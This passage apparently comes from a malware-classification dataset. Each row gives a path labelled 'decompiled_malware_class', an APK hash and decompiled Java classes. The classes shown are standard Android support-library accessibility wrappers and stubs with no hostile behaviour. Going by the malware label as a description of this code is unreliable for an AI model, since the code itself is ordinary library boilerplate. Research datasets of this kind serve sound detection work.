obj){     return AccessibilityNodeInfoCompatIcs.isFocusable(obj);   }   @Override public boolean isFocused(  Object obj){     return AccessibilityNodeInfoCompatIcs.isFocused(obj);   }   @Override public boolean isLongClickable(  Object obj){     return AccessibilityNodeInfoCompatIcs.isLongClickable(obj);   }   @Override public boolean isPassword(  Object obj){     return AccessibilityNodeInfoCompatIcs.isPassword(obj);   }   @Override public boolean isScrollable(  Object obj){     return AccessibilityNodeInfoCompatIcs.isScrollable(obj);   }   @Override public boolean isSelected(  Object obj){     return AccessibilityNodeInfoCompatIcs.isSelected(obj);   }   @Override public Object obtain(){     return AccessibilityNodeInfoCompatIcs.obtain();   }   @Override public Object obtain(  View view){     return AccessibilityNodeInfoCompatIcs.obtain(view);   }   @Override public Object obtain(  Object obj){     return AccessibilityNodeInfoCompatIcs.obtain(obj);   }   @Override public boolean performAction(  Object obj,  int i){     return AccessibilityNodeInfoCompatIcs.performAction(obj,i);   }   @Override public void recycle(  Object obj){     AccessibilityNodeInfoCompatIcs.recycle(obj);   }   @Override public void setBoundsInParent(  Object obj,  Rect rect){     AccessibilityNodeInfoCompatIcs.setBoundsInParent(obj,rect);   }   @Override public void setBoundsInScreen(  Object obj,  Rect rect){     AccessibilityNodeInfoCompatIcs.setBoundsInScreen(obj,rect);   }   @Override public void setCheckable(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setCheckable(obj,z);   }   @Override public void setChecked(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setChecked(obj,z);   }   @Override public void setClassName(  Object obj,  CharSequence charSequence){     AccessibilityNodeInfoCompatIcs.setClassName(obj,charSequence);   }   @Override public void setClickable(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setClickable(obj,z);   }   @Override public void setContentDescription(  Object obj,  CharSequence charSequence){     AccessibilityNodeInfoCompatIcs.setContentDescription(obj,charSequence);   }   @Override public void setEnabled(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setEnabled(obj,z);   }   @Override public void setFocusable(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setFocusable(obj,z);   }   @Override public void setFocused(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setFocused(obj,z);   }   @Override public void setLongClickable(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setLongClickable(obj,z);   }   @Override public void setPackageName(  Object obj,  CharSequence charSequence){     AccessibilityNodeInfoCompatIcs.setPackageName(obj,charSequence);   }   @Override public void setParent(  Object obj,  View view){     AccessibilityNodeInfoCompatIcs.setParent(obj,view);   }   @Override public void setPassword(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setPassword(obj,z);   }   @Override public void setScrollable(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setScrollable(obj,z);   }   @Override public void setSelected(  Object obj,  boolean z){     AccessibilityNodeInfoCompatIcs.setSelected(obj,z);   }   @Override public void setSource(  Object obj,  View view){     AccessibilityNodeInfoCompatIcs.setSource(obj,view);   }   @Override public void setText(  Object obj,  CharSequence charSequence){     AccessibilityNodeInfoCompatIcs.setText(obj,charSequence);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoImpl.code","public interface AccessibilityNodeInfoImpl {   void addAction(  Object obj,  int i);   void addChild(  Object obj,  View view);   void addChild(  Object obj,  View view,  int i);   List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str);   Object findFocus(  Object obj,  int i);   Object focusSearch(  Object obj,  int i);   int getActions(  Object obj);   void getBoundsInParent(  Object obj,  Rect rect);   void getBoundsInScreen(  Object obj,  Rect rect);   Object getChild(  Object obj,  int i);   int getChildCount(  Object obj);   CharSequence getClassName(  Object obj);   CharSequence getContentDescription(  Object obj);   int getLiveRegion(  Object obj);   int getMovementGranularities(  Object obj);   CharSequence getPackageName(  Object obj);   Object getParent(  Object obj);   CharSequence getText(  Object obj);   String getViewIdResourceName(  Object obj);   int getWindowId(  Object obj);   boolean isAccessibilityFocused(  Object obj);   boolean isCheckable(  Object obj);   boolean isChecked(  Object obj);   boolean isClickable(  Object obj);   boolean isEnabled(  Object obj);   boolean isFocusable(  Object obj);   boolean isFocused(  Object obj);   boolean isLongClickable(  Object obj);   boolean isPassword(  Object obj);   boolean isScrollable(  Object obj);   boolean isSelected(  Object obj);   boolean isVisibleToUser(  Object obj);   Object obtain();   Object obtain(  View view);   Object obtain(  View view,  int i);   Object obtain(  Object obj);   boolean performAction(  Object obj,  int i);   boolean performAction(  Object obj,  int i,  Bundle bundle);   void recycle(  Object obj);   void setAccessibilityFocused(  Object obj,  boolean z);   void setBoundsInParent(  Object obj,  Rect rect);   void setBoundsInScreen(  Object obj,  Rect rect);   void setCheckable(  Object obj,  boolean z);   void setChecked(  Object obj,  boolean z);   void setClassName(  Object obj,  CharSequence charSequence);   void setClickable(  Object obj,  boolean z);   void setContentDescription(  Object obj,  CharSequence charSequence);   void setEnabled(  Object obj,  boolean z);   void setFocusable(  Object obj,  boolean z);   void setFocused(  Object obj,  boolean z);   void setLiveRegion(  Object obj,  int i);   void setLongClickable(  Object obj,  boolean z);   void setMovementGranularities(  Object obj,  int i);   void setPackageName(  Object obj,  CharSequence charSequence);   void setParent(  Object obj,  View view);   void setParent(  Object obj,  View view,  int i);   void setPassword(  Object obj,  boolean z);   void setScrollable(  Object obj,  boolean z);   void setSelected(  Object obj,  boolean z);   void setSource(  Object obj,  View view);   void setSource(  Object obj,  View view,  int i);   void setText(  Object obj,  CharSequence charSequence);   void setViewIdResourceName(  Object obj,  String str);   void setVisibleToUser(  Object obj,  boolean z); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoJellybeanImpl.code","class AccessibilityNodeInfoJellybeanImpl extends AccessibilityNodeInfoIcsImpl {   AccessibilityNodeInfoJellybeanImpl(){   }   @Override public void addChild(  Object obj,  View view,  int i){     AccessibilityNodeInfoCompatJellyBean.addChild(obj,view,i);   }   @Override public Object findFocus(  Object obj,  int i){     return AccessibilityNodeInfoCompatJellyBean.findFocus(obj,i);   }   @Override public Object focusSearch(  Object obj,  int i){     return AccessibilityNodeInfoCompatJellyBean.focusSearch(obj,i);   }   @Override public int getMovementGranularities(  Object obj){     return AccessibilityNodeInfoCompatJellyBean.getMovementGranularities(obj);   }   @Override public boolean isAccessibilityFocused(  Object obj){     return AccessibilityNodeInfoCompatJellyBean.isAccessibilityFocused(obj);   }   @Override public boolean isVisibleToUser(  Object obj){     return AccessibilityNodeInfoCompatJellyBean.isVisibleToUser(obj);   }   @Override public Object obtain(  View view,  int i){     return AccessibilityNodeInfoCompatJellyBean.obtain(view,i);   }   @Override public boolean performAction(  Object obj,  int i,  Bundle bundle){     return AccessibilityNodeInfoCompatJellyBean.performAction(obj,i,bundle);   }   @Override public void setAccessibilityFocused(  Object obj,  boolean z){     AccessibilityNodeInfoCompatJellyBean.setAccesibilityFocused(obj,z);   }   @Override public void setMovementGranularities(  Object obj,  int i){     AccessibilityNodeInfoCompatJellyBean.setMovementGranularities(obj,i);   }   @Override public void setParent(  Object obj,  View view,  int i){     AccessibilityNodeInfoCompatJellyBean.setParent(obj,view,i);   }   @Override public void setSource(  Object obj,  View view,  int i){     AccessibilityNodeInfoCompatJellyBean.setSource(obj,view,i);   }   @Override public void setVisibleToUser(  Object obj,  boolean z){     AccessibilityNodeInfoCompatJellyBean.setVisibleToUser(obj,z);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoJellybeanMr2Impl.code","class AccessibilityNodeInfoJellybeanMr2Impl extends AccessibilityNodeInfoJellybeanImpl {   AccessibilityNodeInfoJellybeanMr2Impl(){   }   @Override public String getViewIdResourceName(  Object obj){     return AccessibilityNodeInfoCompatJellybeanMr2.getViewIdResourceName(obj);   }   @Override public void setViewIdResourceName(  Object obj,  String str){     AccessibilityNodeInfoCompatJellybeanMr2.setViewIdResourceName(obj,str);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoKitKatImpl.code","class AccessibilityNodeInfoKitKatImpl extends AccessibilityNodeInfoJellybeanMr2Impl {   AccessibilityNodeInfoKitKatImpl(){   }   @Override public int getLiveRegion(  Object obj){     return AccessibilityNodeInfoCompatKitKat.getLiveRegion(obj);   }   @Override public void setLiveRegion(  Object obj,  int i){     AccessibilityNodeInfoCompatKitKat.setLiveRegion(obj,i);   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeInfoStubImpl.code","class AccessibilityNodeInfoStubImpl implements AccessibilityNodeInfoImpl {   AccessibilityNodeInfoStubImpl(){   }   @Override public void addAction(  Object obj,  int i){   }   @Override public void addChild(  Object obj,  View view){   }   @Override public void addChild(  Object obj,  View view,  int i){   }   @Override public List<Object> findAccessibilityNodeInfosByText(  Object obj,  String str){     return Collections.emptyList();   }   @Override public Object findFocus(  Object obj,  int i){     return null;   }   @Override public Object focusSearch(  Object obj,  int i){     return null;   }   @Override public int getActions(  Object obj){     return 0;   }   @Override public void getBoundsInParent(  Object obj,  Rect rect){   }   @Override public void getBoundsInScreen(  Object obj,  Rect rect){   }   @Override public Object getChild(  Object obj,  int i){     return null;   }   @Override public int getChildCount(  Object obj){     return 0;   }   @Override public CharSequence getClassName(  Object obj){     return null;   }   @Override public CharSequence getContentDescription(  Object obj){     return null;   }   @Override public int getLiveRegion(  Object obj){     return 0;   }   @Override public int getMovementGranularities(  Object obj){     return 0;   }   @Override public CharSequence getPackageName(  Object obj){     return null;   }   @Override public Object getParent(  Object obj){     return null;   }   @Override public CharSequence getText(  Object obj){     return null;   }   @Override public String getViewIdResourceName(  Object obj){     return null;   }   @Override public int getWindowId(  Object obj){     return 0;   }   @Override public boolean isAccessibilityFocused(  Object obj){     return false;   }   @Override public boolean isCheckable(  Object obj){     return false;   }   @Override public boolean isChecked(  Object obj){     return false;   }   @Override public boolean isClickable(  Object obj){     return false;   }   @Override public boolean isEnabled(  Object obj){     return false;   }   @Override public boolean isFocusable(  Object obj){     return false;   }   @Override public boolean isFocused(  Object obj){     return false;   }   @Override public boolean isLongClickable(  Object obj){     return false;   }   @Override public boolean isPassword(  Object obj){     return false;   }   @Override public boolean isScrollable(  Object obj){     return false;   }   @Override public boolean isSelected(  Object obj){     return false;   }   @Override public boolean isVisibleToUser(  Object obj){     return false;   }   @Override public Object obtain(){     return null;   }   @Override public Object obtain(  View view){     return null;   }   @Override public Object obtain(  View view,  int i){     return null;   }   @Override public Object obtain(  Object obj){     return null;   }   @Override public boolean performAction(  Object obj,  int i){     return false;   }   @Override public boolean performAction(  Object obj,  int i,  Bundle bundle){     return false;   }   @Override public void recycle(  Object obj){   }   @Override public void setAccessibilityFocused(  Object obj,  boolean z){   }   @Override public void setBoundsInParent(  Object obj,  Rect rect){   }   @Override public void setBoundsInScreen(  Object obj,  Rect rect){   }   @Override public void setCheckable(  Object obj,  boolean z){   }   @Override public void setChecked(  Object obj,  boolean z){   }   @Override public void setClassName(  Object obj,  CharSequence charSequence){   }   @Override public void setClickable(  Object obj,  boolean z){   }   @Override public void setContentDescription(  Object obj,  CharSequence charSequence){   }   @Override public void setEnabled(  Object obj,  boolean z){   }   @Override public void setFocusable(  Object obj,  boolean z){   }   @Override public void setFocused(  Object obj,  boolean z){   }   @Override public void setLiveRegion(  Object obj,  int i){   }   @Override public void setLongClickable(  Object obj,  boolean z){   }   @Override public void setMovementGranularities(  Object obj,  int i){   }   @Override public void setPackageName(  Object obj,  CharSequence charSequence){   }   @Override public void setParent(  Object obj,  View view){   }   @Override public void setParent(  Object obj,  View view,  int i){   }   @Override public void setPassword(  Object obj,  boolean z){   }   @Override public void setScrollable(  Object obj,  boolean z){   }   @Override public void setSelected(  Object obj,  boolean z){   }   @Override public void setSource(  Object obj,  View view){   }   @Override public void setSource(  Object obj,  View view,  int i){   }   @Override public void setText(  Object obj,  CharSequence charSequence){   }   @Override public void setViewIdResourceName(  Object obj,  String str){   }   @Override public void setVisibleToUser(  Object obj,  boolean z){   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeProviderCompat.code","public class AccessibilityNodeProviderCompat {   private static final AccessibilityNodeProviderImpl IMPL;   private final Object mProvider; interface AccessibilityNodeProviderImpl {     Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat accessibilityNodeProviderCompat);   } class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderJellyBeanImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat accessibilityNodeProviderCompat){       return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){         @Override public Object createAccessibilityNodeInfo(        int i){           AccessibilityNodeInfoCompat createAccessibilityNodeInfo=accessibilityNodeProviderCompat.createAccessibilityNodeInfo(i);           if (createAccessibilityNodeInfo == null) {             return null;           }           return createAccessibilityNodeInfo.getInfo();         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String str,        int i){           List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText=accessibilityNodeProviderCompat.findAccessibilityNodeInfosByText(str,i);           ArrayList arrayList=new ArrayList();           int size=findAccessibilityNodeInfosByText.size();           for (int i2=0; i2 < size; i2++) {             arrayList.add(findAccessibilityNodeInfosByText.get(i2).getInfo());           }           return arrayList;         }         @Override public boolean performAction(        int i,        int i2,        Bundle bundle){           return accessibilityNodeProviderCompat.performAction(i,i2,bundle);         }       } );     }   } class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {     AccessibilityNodeProviderKitKatImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    final AccessibilityNodeProviderCompat accessibilityNodeProviderCompat){       return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){         @Override public Object createAccessibilityNodeInfo(        int i){           AccessibilityNodeInfoCompat createAccessibilityNodeInfo=accessibilityNodeProviderCompat.createAccessibilityNodeInfo(i);           if (createAccessibilityNodeInfo == null) {             return null;           }           return createAccessibilityNodeInfo.getInfo();         }         @Override public List<Object> findAccessibilityNodeInfosByText(        String str,        int i){           List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText=accessibilityNodeProviderCompat.findAccessibilityNodeInfosByText(str,i);           ArrayList arrayList=new ArrayList();           int size=findAccessibilityNodeInfosByText.size();           for (int i2=0; i2 < size; i2++) {             arrayList.add(findAccessibilityNodeInfosByText.get(i2).getInfo());           }           return arrayList;         }         @Override public Object findFocus(        int i){           AccessibilityNodeInfoCompat findFocus=accessibilityNodeProviderCompat.findFocus(i);           if (findFocus == null) {             return null;           }           return findFocus.getInfo();         }         @Override public boolean performAction(        int i,        int i2,        Bundle bundle){           return accessibilityNodeProviderCompat.performAction(i,i2,bundle);         }       } );     }   } class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {     AccessibilityNodeProviderStubImpl(){     }     @Override public Object newAccessibilityNodeProviderBridge(    AccessibilityNodeProviderCompat accessibilityNodeProviderCompat){       return null;     }   } static {     if (Build.VERSION.SDK_INT >= 19) {       IMPL=new AccessibilityNodeProviderKitKatImpl();     }  else     if (Build.VERSION.SDK_INT >= 16) {       IMPL=new AccessibilityNodeProviderJellyBeanImpl();     }  else {       IMPL=new AccessibilityNodeProviderStubImpl();     }   }   public AccessibilityNodeProviderCompat(){     this.mProvider=IMPL.newAccessibilityNodeProviderBridge(this);   }   public AccessibilityNodeProviderCompat(  Object obj){     this.mProvider=obj;   }   public AccessibilityNodeInfoCompat createAccessibilityNodeInfo(  int i){     return null;   }   public List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText(  String str,  int i){     return null;   }   public AccessibilityNodeInfoCompat findFocus(  int i){     return null;   }   public Object getProvider(){     return this.mProvider;   }   public boolean performAction(  int i,  int i2,  Bundle bundle){     return false;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeProviderCompatJellyBean.code","class AccessibilityNodeProviderCompatJellyBean { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatJellyBean(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge accessibilityNodeInfoBridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int i){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(i);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String str,      int i){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(str,i);       }       @Override public boolean performAction(      int i,      int i2,      Bundle bundle){         return AccessibilityNodeInfoBridge.this.performAction(i,i2,bundle);       }     } ;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeProviderCompatKitKat.code","class AccessibilityNodeProviderCompatKitKat { interface AccessibilityNodeInfoBridge {     Object createAccessibilityNodeInfo(    int i);     List<Object> findAccessibilityNodeInfosByText(    String str,    int i);     Object findFocus(    int i);     boolean performAction(    int i,    int i2,    Bundle bundle);   }   AccessibilityNodeProviderCompatKitKat(){   }   public static Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeInfoBridge accessibilityNodeInfoBridge){     return new AccessibilityNodeProvider(){       @Override public AccessibilityNodeInfo createAccessibilityNodeInfo(      int i){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.createAccessibilityNodeInfo(i);       }       @Override public List<AccessibilityNodeInfo> findAccessibilityNodeInfosByText(      String str,      int i){         return AccessibilityNodeInfoBridge.this.findAccessibilityNodeInfosByText(str,i);       }       @Override public AccessibilityNodeInfo findFocus(      int i){         return (AccessibilityNodeInfo)AccessibilityNodeInfoBridge.this.findFocus(i);       }       @Override public boolean performAction(      int i,      int i2,      Bundle bundle){         return AccessibilityNodeInfoBridge.this.performAction(i,i2,bundle);       }     } ;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeProviderImpl.code","interface AccessibilityNodeProviderImpl {   Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat accessibilityNodeProviderCompat); } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeProviderJellyBeanImpl.code","class AccessibilityNodeProviderJellyBeanImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderJellyBeanImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat accessibilityNodeProviderCompat){     return AccessibilityNodeProviderCompatJellyBean.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatJellyBean.AccessibilityNodeInfoBridge(){       @Override public Object createAccessibilityNodeInfo(      int i){         AccessibilityNodeInfoCompat createAccessibilityNodeInfo=accessibilityNodeProviderCompat.createAccessibilityNodeInfo(i);         if (createAccessibilityNodeInfo == null) {           return null;         }         return createAccessibilityNodeInfo.getInfo();       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String str,      int i){         List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText=accessibilityNodeProviderCompat.findAccessibilityNodeInfosByText(str,i);         ArrayList arrayList=new ArrayList();         int size=findAccessibilityNodeInfosByText.size();         for (int i2=0; i2 < size; i2++) {           arrayList.add(findAccessibilityNodeInfosByText.get(i2).getInfo());         }         return arrayList;       }       @Override public boolean performAction(      int i,      int i2,      Bundle bundle){         return accessibilityNodeProviderCompat.performAction(i,i2,bundle);       }     } );   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeProviderKitKatImpl.code","class AccessibilityNodeProviderKitKatImpl extends AccessibilityNodeProviderStubImpl {   AccessibilityNodeProviderKitKatImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  final AccessibilityNodeProviderCompat accessibilityNodeProviderCompat){     return AccessibilityNodeProviderCompatKitKat.newAccessibilityNodeProviderBridge(new AccessibilityNodeProviderCompatKitKat.AccessibilityNodeInfoBridge(){       @Override public Object createAccessibilityNodeInfo(      int i){         AccessibilityNodeInfoCompat createAccessibilityNodeInfo=accessibilityNodeProviderCompat.createAccessibilityNodeInfo(i);         if (createAccessibilityNodeInfo == null) {           return null;         }         return createAccessibilityNodeInfo.getInfo();       }       @Override public List<Object> findAccessibilityNodeInfosByText(      String str,      int i){         List<AccessibilityNodeInfoCompat> findAccessibilityNodeInfosByText=accessibilityNodeProviderCompat.findAccessibilityNodeInfosByText(str,i);         ArrayList arrayList=new ArrayList();         int size=findAccessibilityNodeInfosByText.size();         for (int i2=0; i2 < size; i2++) {           arrayList.add(findAccessibilityNodeInfosByText.get(i2).getInfo());         }         return arrayList;       }       @Override public Object findFocus(      int i){         AccessibilityNodeInfoCompat findFocus=accessibilityNodeProviderCompat.findFocus(i);         if (findFocus == null) {           return null;         }         return findFocus.getInfo();       }       @Override public boolean performAction(      int i,      int i2,      Bundle bundle){         return accessibilityNodeProviderCompat.performAction(i,i2,bundle);       }     } );   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityNodeProviderStubImpl.code","class AccessibilityNodeProviderStubImpl implements AccessibilityNodeProviderImpl {   AccessibilityNodeProviderStubImpl(){   }   @Override public Object newAccessibilityNodeProviderBridge(  AccessibilityNodeProviderCompat accessibilityNodeProviderCompat){     return null;   } } "
"msc_data/decompiled_malware_class/000FEED1F11E6C2BD606A1E0D1DFE7C110A98A275145FD5BBFE302C76078E826\com.fw.tzthree.v4.viewpager\AccessibilityRecordCompat.code","public class AccessibilityRecordCompat {   private static final AccessibilityRecordImpl IMPL;   private final Object mRecord; class AccessibilityRecordIcsImpl extends AccessibilityRecordStubImpl {     AccessibilityRecordIcsImpl(){     }     @Override public int getAddedCount(    Object obj){       return AccessibilityRecordCompatIcs.getAddedCount(obj);     }     @Override public CharSequence getBeforeText(    Object obj){       return AccessibilityRecordCompatIcs.getBeforeText(obj);     }     @Override public CharSequence getClassName(    Object obj){       return AccessibilityRecordCompatIcs.getClassName(obj);     }     @Override public CharSequence getContentDescription(    Object obj){       return AccessibilityRecordCompatIcs.getContentDescription(obj);     }     @Override public int getCurrentItemIndex(    Object obj){       return AccessibilityRecordCompatIcs.getCurrentItemIndex(obj);     }     @Override public int getFromIndex(    Object obj){       return AccessibilityRecordCompatIcs.getFromIndex(obj);     }     @Override public int getItemCount(    Object obj){       return AccessibilityRecordCompatIcs.getItemCount(obj);     }     @Override public Parcelable getParcelableData(    Object obj){       return AccessibilityRecordCompatIcs.getParcelableData(obj);     }     @Override public int getRemovedCount(    Object obj){       return AccessibilityRecordCompatIcs.getRemovedCount(obj);     }     @Override public int getScrollX(    Object obj){       return AccessibilityRecordCompatIcs.getScrollX(obj);     }     @Override public int getScrollY(    Object obj){       return AccessibilityRecordCompatIcs.getScrollY(obj);     }     @Override public AccessibilityNodeInfoCompat getSource(    Object obj){       return AccessibilityNodeInfoCompat.wrapNonNullInstance(AccessibilityRecordCompatIcs.getSource(obj));     }     @Override public List<CharSequence> getText(    Object obj){       return AccessibilityRecordCompatIcs.getText(obj);     }     @Override public int getToIndex(    Object obj){       return AccessibilityRecordCompatIcs.getToIndex(obj);     }     @Override public int getWindowId(    Object obj){       return AccessibilityRecordCompatIcs.getWindowId(obj);     }     @Override public boolean isChecked(    Object obj){       return AccessibilityRecordCompatIcs.isChecked(obj);     }     @Override public boolean isEnabled(    Object obj){       return AccessibilityRecordCompatIcs.isEnabled(obj);     }     @Override public boolean isFullScreen(    Object obj){       return AccessibilityRecordCompatIcs.isFullScreen(obj);     }     @Override public boolean isPassword(    Object obj){       return AccessibilityRecordCompatIcs.isPassword(obj);     }     @Override public boolean isScrollable(    Object obj){       return AccessibilityRecordCompatIcs.isScrollable(obj);     }     @Override public Object obtain(){       return AccessibilityRecordCompatIcs.obtain();     }     @Override public Object obtain(    Object obj){       return AccessibilityRecordCompatIcs.obtain(obj);     }     @Override public void recycle(    Object obj){       AccessibilityRecordCompatIcs.recycle(obj);     }     @Override public void setAddedCount(    Object obj,    int i){       AccessibilityRecordCompatIcs.setAddedCount(obj,i);     }     @Override public void setBeforeText(    Object obj,    CharSequence charSequence){       AccessibilityRecordCompatIcs.setBeforeText(obj,charSequence);     }     @Override public void setChecked(    Object obj,    boolean z){       AccessibilityRecordCompatIcs.setChecked(obj,z);     }     @Override public void setClassName(    Object obj,    CharSequence charSequence){       AccessibilityRecordCompatIcs.setClassName(obj,charSequence);     }     @Override public void setContentDescription(    Object obj,    CharSequence charSequence){       AccessibilityRecordCompatIcs.setContentDescription(obj,charSequence);     }     @Override public void setCurrentItemIndex(    Object obj,    int i){       AccessibilityRecordCompatIcs.setCurrentItemIndex(obj,i);     }     @Override public void setEnabled(    Object obj,    boolean z){       AccessibilityRecordCompatIcs.setEnabled(obj,z);     }     @Override public void setFromIndex(    Object obj,    int i){       AccessibilityRecordCompatIcs.setFromIndex(obj,i);     }     @Override public void setFullScreen(    Object obj,    boolean z){       AccessibilityRecordCompatIcs.setFullScreen(obj,z);     }     @Override public void setItemCount(    Object obj,    int i){       AccessibilityRecordCompatIcs.setItemCount(obj,i);     }     @Override public void setParcelableData(    Object obj,    Parcelable parcelable){       AccessibilityRecordCompatIcs.setParcelableData(obj,parcelable);     }     @Override public void setPassword(    Object obj,    boolean z){       AccessibilityRecordCompatIcs.setPassword(obj,z);     }     @Override public void setRemovedCount(    Object obj,    int i){       AccessibilityRecordCompatIcs.setRemovedCount(obj,i);     }     @Override public void setScrollX(    Object obj,    int i){       AccessibilityRecordCompatIcs.setScrollX(obj,i);     }     @Override public void setScrollY(    Object obj,    int i){       AccessibilityRecordCompatIcs.setScrollY(obj,i);     }     @Override public void setScrollable(    Object obj,    boolean z){       AccessibilityRecordCompatIcs.setScrollable(obj,z);     }     @Override public void setSource(    Object obj,    View view){       AccessibilityRecordCompatIcs.setSource(obj,view);     }     @Override public void setToIndex(    Object obj,    int i){       AccessibilityRecordCompatIcs.setToIndex(obj,i);     }   } class AccessibilityRecordIcsMr1Impl extends AccessibilityRecordIcsImpl {     AccessibilityRecordIcsMr1Impl(){     }     @Override public int getMaxScrollX(    Object obj){       return AccessibilityRecordCompatIcsMr1.getMaxScrollX(obj);     }     @Override public int getMaxScrollY(    Object obj){       return AccessibilityRecordCompatIcsMr1.getMaxScrollY(obj);     }     @Override public void setMaxScrollX(    Object obj,    int i){       AccessibilityRecordCompatIcsMr1.setMaxScrollX(obj,i);     }     @Override public void setMaxScrollY(    Object obj,    int i){       AccessibilityRecordCompatIcsMr1.setMaxScrollY(obj,i);     }   } interface AccessibilityRecordImpl {     int getAddedCount(    Object obj);     CharSequence getBeforeText(    Object obj);     CharSequence getClassName(    Object obj);     CharSequence getContentDescription(    Object obj);     int getCurrentItemIndex(    Object obj);     int getFromIndex(    Object obj);     int getItemCount(    Object obj);     int getMaxScrollX(    Object obj);     int getMaxScrollY(    Object obj);     Parcelable getParcelableData(    Object obj);     int getRemovedCount(    Object obj);     int getScrollX(    Object obj);     int getScrollY(    Object obj);     AccessibilityNodeInfoCompat getSource(    Object obj);     List<CharSequence> getText(    Object obj);     int getToIndex(    Object obj);     int getWindowId(    Object obj);     boolean isChecked(    Object obj);     boolean isEnabled(    Object obj);     boolean isFullScreen(    Object obj);     boolean isPassword(    Object obj);     boolean isScrollable(    Object obj);     Object obtain();     Object obtain(    Object obj);     void recycle(    Object obj);     void setAddedCount(    Object obj,    int i);     void setBeforeText(    Object obj,    CharSequence charSequence);     void setChecked(    Object obj,    boolean z);     void setClassName(    Object obj,    CharSequence charSequence);     void setContentDescription(    Object obj,    CharSequence charSequence);     void setCurrentItemIndex(    Object obj,    int i);     void setEnabled(    Object obj,    boolean z);     void setFromIndex(    Object obj,    int i);     void setFullScreen(    Object obj,    boolean z);     void setItemCount(    Object obj,    int i);     void setMaxScrollX(    Object obj,    int i);     void setMaxScrollY(    Object obj,    int i);     void setParcelableData(    Object obj,    Parcelable parcelable);     void setPassword(    Object obj,    boolean z);     void setRemovedCount(    Object obj,    int i);     void setScrollX(    Object obj,    int i);     void setScrollY(    Object obj,    int i);     void setScrollable(    Object obj,    boolean z);     void setSource(    Object obj,    View view);     void setSource(    Object obj,    View view,    int i);     void setToIndex(    Object obj,    int i);   } class 